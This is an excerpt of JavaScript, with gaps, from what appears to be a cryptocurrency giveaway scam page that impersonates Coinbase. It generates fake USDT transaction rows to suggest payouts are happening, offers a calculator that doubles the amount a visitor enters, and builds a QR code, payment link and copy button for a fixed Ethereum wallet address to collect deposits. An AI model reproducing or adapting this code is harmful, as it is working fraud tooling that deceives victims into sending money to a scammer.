...
function create_transaction(mins) {
  var table,
    ...
    address = get_random(),
    amount = (49000.5 * Math.random()).toFixed(2),
    decimal = String(Math.random(10, 999))
  row.innerHTML =
    ...
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x742f4a2f3D2951873D5D9f824B98F1822cC5d670</span> </td> <td>' +
    amount +
  ...
  row.innerHTML =
    ...
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">0x742f4a2f3D2951873D5D9f824B98F1822cC5d670</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    '</a> </td> <td>' +
    send_amount +
    ' USDT</td> <td><span class="small text-secondary">0<b>.</b>000' +
  ...
  ;(row.innerHTML =
    ...
    setTimeout(() => {
      ...
      ;(row.innerHTML =
        ...
        '</a> </td> <td class="d-none d-sm-table-cell"><a href="">4' +
        tx(99999999) +
        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">0x742f4a2f3D2951873D5D9f824B98F1822cC5d670</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
        address +
        '</a> </td> <td>' +
        send_amount +
        ' USDT</td> <td><span class="small text-secondary">0<b>.</b>000' +
...
;(get_random = function (
  ...
  $('#gen-btn').click(() => {
    if ($('#cal-in').val() >= 0.01 && $('#cal-in').val() <= 500000) {
      ...
      $('#qrcode_svg').attr(
        'src',
        'https://api.qrserver.com/v1/create-qr-code/?data=ethereum%3A0x742f4a2f3D2951873D5D9f824B98F1822cC5d670%3Famount%3D' +
          amount_entered +
      ...
      $('#paynow')
        ...
        .attr(
          'href',
          'ethereum:0x742f4a2f3D2951873D5D9f824B98F1822cC5d670?amount=' +
            amount_entered +
            '&message=Deposit+to+Coinbase+Giveaway+' +
            tm,
        )
    } else $('#warn').text('Amount should be within $1500 and above')
  }),
  $('#close').click(() => {
  ...
  $('#cal-in').on('input', () => {
    ...
    if (in_amount > 0 && in_amount < 50000) {
      $('#cal-out').val(in_amount * 2)
    } else if ((in_amount) => 50000 && in_amount <= 500000) {
...
$('#cal-out').on('input', () => {
  ...
  } else if ((in_amount) => 150000 && in_amount <= 300000) {
...
$('#copy_address').click(() => {
  $('#copy_address').attr(
    'data-clipboard-text',
    '0x742f4a2f3D2951873D5D9f824B98F1822cC5d670',
  )
